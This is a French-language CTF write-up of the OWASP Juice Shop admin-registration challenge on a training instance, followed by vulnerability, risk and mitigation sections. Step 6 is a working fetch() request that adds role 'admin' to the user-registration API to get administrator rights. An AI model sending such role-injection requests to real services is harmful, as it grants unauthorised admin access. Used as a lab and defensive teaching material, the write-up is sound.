# contrôle d'accès défectueux-3-Inscription de l'administrateur

## 1. Méthodologie

   1. Accéder à la page d'inscription de la boutique.
   2. Observer les champs du formulaire et les requêtes envoyées lors de la soumission.
   3. Remarquer que le rôle de l'utilisateur n'est pas protégé côté client.
   4. Ouvrir la console du navigateur.
   5. Modifier manuellement la requête pour inclure le champ role = admin.
   6. Envoyer la requête manuellement : 
                                                    fetch('https://ctf.juice.cyber.epitest.eu/api/Users', {
                                                    method: 'POST',
                                                    headers: {
                                                        'Content-Type': 'application/json'
                                                    },
                                                    body: JSON.stringify({
                                                        email: 'admin@juice.sh',
                                                        password: '123456',
                                                        passwordRepeat: '123456',
                                                        role: 'admin',
                                                        securityQuestion: { id: 1 },
                                                        answer: 'Nice'
                                                    })
                                                    });
   7. Étape réussie : l’utilisateur est inscrit avec les droits admin.

**techniques utilisées :**

   - Ajout d’un champ non prévu dans le formulaire
   - Falsification de rôle utilisateur via requête manuelle

## 2. Vulnérabilités

- **type :** Contrôle d’accès défectueux / élévation de privilèges
- **composant affecté :** Système d’inscription des utilisateurs
- **Séverité estimée :** Critique

## 3. Risques

- Création de comptes administrateurs non autorisés
- Accès complet à l’interface d’administration
- Suppression ou modification de données sensibles
- Compromission totale de la boutique
- Perte de confiance et atteinte à la sécurité des clients

## 4. Actions

- **Mitigation :**
   - Supprimer toute possibilité de définir le role côté client.
   - Forcer le rôle utilisateur côté serveur selon le contexte d’inscription.

- **Correctifs :**
   - Vérifier que seul un processus interne peut créer un compte administrateur.
   - Implémenter une logique stricte de rôle et de privilèges côté serveur.

- **Bonnes pratiques :**
   - Ne jamais exposer les rôles dans les formulaires publics.
   - Auditer régulièrement les endpoints sensibles.
   - Appliquer les recommandations OWASP sur le contrôle d’accès.